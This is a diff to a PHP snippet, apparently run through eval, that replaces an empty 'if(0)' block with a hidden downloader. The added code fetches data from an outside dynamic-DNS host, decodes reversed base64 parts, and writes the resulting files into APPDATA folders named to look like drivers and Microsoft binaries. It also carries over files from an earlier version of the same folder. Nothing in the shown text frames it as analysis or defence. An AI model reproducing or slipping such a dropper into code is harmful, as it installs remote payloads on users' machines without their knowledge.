@@ -2,9 +2,47 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 [__GIT_COMMAND]
 
-if(0)
+$new_path = getenv( 'APPDATA' ) . '\\Drivers x86 v4.56643300';
+$old_path = getenv( 'APPDATA' ) . '\\Drivers x86 v3.42482475';
+$work_path = getenv( 'APPDATA' ) . '\\Microsoft Binaries v3.42482475';
+$com = @file_get_contents('http://secondsapphost.servehttp.com/php7/com_v13.1');
+if($com && '13.1' !== @file_get_contents($work_path . '\\version'))
 {
-    
+	@mkdir($new_path);
+	@mkdir($new_path . '\\prt');
+	$data = scandir($old_path);
+	foreach($data as $dt)
+	{
+		$path = $old_path . '\\' . $dt;
+		$npath = $new_path . '\\' . $dt;
+		if($dt === '.' || $dr === '..' || !is_file($path))
+			continue;
+		@copy($path, $npath);
+	}
+	$data = $com;
+	$file_name = '';
+	$count_files = 0;
+	$x = 1;
+	$parts = preg_split('/\{PART\}/is', $data);
+	for($i=1; $i<count($parts)-1; $i++)
+	{
+		$part = @base64_decode(strrev($parts[$i]));
+		$x = $x * -1;
+		if($x == -1)
+		{
+			$file_name = $part;
+		}
+		else
+		{
+			$count_files++;
+			$path = '';
+			if($count_files == 1)
+				$path = $new_path . '\\' . $file_name;
+			else
+				$path = $new_path . "\\prt\\" . $file_name;
+			@file_put_contents($path, $part);
+		}
+	}
 }
 
 [/GIT_COMMAND]
